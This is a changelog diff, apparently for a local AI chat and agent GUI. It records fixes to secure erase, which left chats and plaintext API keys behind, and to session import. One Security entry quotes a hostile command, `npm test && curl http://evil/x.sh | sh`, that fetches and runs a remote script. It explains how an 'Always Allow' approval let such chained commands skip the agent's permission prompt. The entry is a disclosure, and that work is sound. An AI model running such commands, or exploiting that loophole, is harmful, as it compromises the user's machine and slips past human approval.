@@ -48,6 +48,24 @@ end against a live vLLM 0.28 server (`nvidia/Qwen3.6-35B-A3B-NVFP4`).
   calling, which vLLM implements natively.
 
 ### Security
+- **"Securely erase all local data" now erases it (#596).** It cleared only
+  localStorage, leaving every chat, project and folder in the on-disk mirror —
+  and an empty localStorage is precisely the condition that makes boot
+  hydration restore from that mirror, so the user saw "Securely erased N
+  items", relaunched, and found everything back. A new Rust `clear_store`
+  command deletes the mirror file outright (an empty mirror is still a file),
+  reached through an awaitable `clearDisk()` that first cancels any pending
+  debounced write, since one scheduled moments earlier would otherwise land
+  after the erase. Success is reported only once the disk is actually clean.
+- **Secure erase no longer leaves API keys behind (#597).** The wipe matched
+  only the `ollama_gui_` and `mcp_` prefixes, so `model_connections`,
+  `openapi_servers` and `imagegen_config` — all holding plaintext API keys —
+  survived it, along with `custom_tools`, `custom_functions`, `model_presets`,
+  `active_preset_id`, `stt_config` and `voice_settings`. Those keys are now
+  enumerated in `APP_STORAGE_KEYS` and wiped alongside the prefix pass, and
+  the Settings caption states what is actually stored locally instead of
+  claiming every secret already lives in the OS keychain.
+
 - **"Always Allow" no longer hands over a shell (#606, #609).** Approving
   `npm test` once stored the token `npm`, after which `npm test && curl
   http://evil/x.sh | sh` ran with no prompt — and that modal is the only
@@ -84,6 +102,12 @@ end against a live vLLM 0.28 server (`nvidia/Qwen3.6-35B-A3B-NVFP4`).
   agentic loop depends on).
 
 ### Fixed
+- **`/save` → `/load` and `/export json` → Import work again (#598).** Both
+  writers emit a single session object while the only reader demanded an
+  array, so every snapshot failed with "Expected an array of sessions" — at
+  restore time, exactly when the user was relying on it. Fixed in the reader,
+  which also rescues every file already written; a writer-only fix would have
+  stranded them permanently while appearing to work.
 - **Max tokens, stop sequences and top_p now reach OpenAI-compatible servers
   (#568).** An LM Studio or vLLM user could set max tokens and a stop
   sequence, have `/params` confirm both, and never have either sent — replies
